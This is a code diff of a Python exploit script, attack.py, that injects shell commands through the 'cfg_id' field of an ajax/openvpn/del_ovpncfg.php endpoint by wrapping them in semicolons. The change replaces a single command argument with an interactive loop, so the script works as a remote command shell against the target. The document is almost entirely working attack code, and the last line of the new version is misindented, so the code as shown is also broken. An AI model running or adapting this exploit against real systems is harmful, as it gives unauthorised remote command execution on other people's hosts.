@@ -11,25 +11,28 @@ import requests
 from requests.api import post
 import sys, re
 
-if len(sys.argv) != 4:
-    print("python3 attack.py <target-host> <target-port> <command>")
+if len(sys.argv) != 3:
+    print("python3 attack.py <target-host> <target-port>")
     sys.exit()
 else:  
     target_host = sys.argv[1]
     target_port = sys.argv[2]
-    command = ";"+sys.argv[3]+";"
+    
 
     endpoint = "ajax/openvpn/del_ovpncfg.php"
     url = "http://{}:{}/{}".format(target_host,target_port,endpoint)
 
-    s = requests.Session()
-    post_data = {
-        "cfg_id": command
-    }
-    post_Request = s.post(url, data=post_data)
-    if post_Request.status_code==200:
-        print("[*] Sending command ... ")
-        print(post_Request.text)
-        print("Done")
-    else:
-     print("Error.["+post_Request.text+"]")
+    while(True):
+        cmd = input("Please enter a command")
+        command = ";"+cmd+";"
+        s = requests.Session()
+        post_data = {
+            "cfg_id": command
+        }
+        post_Request = s.post(url, data=post_data)
+        if post_Request.status_code==200:
+            print("[*] Sending command ... ")
+            print(post_Request.text)
+            print("Done")
+        else:
+        print("Error.["+post_Request.text+"]")
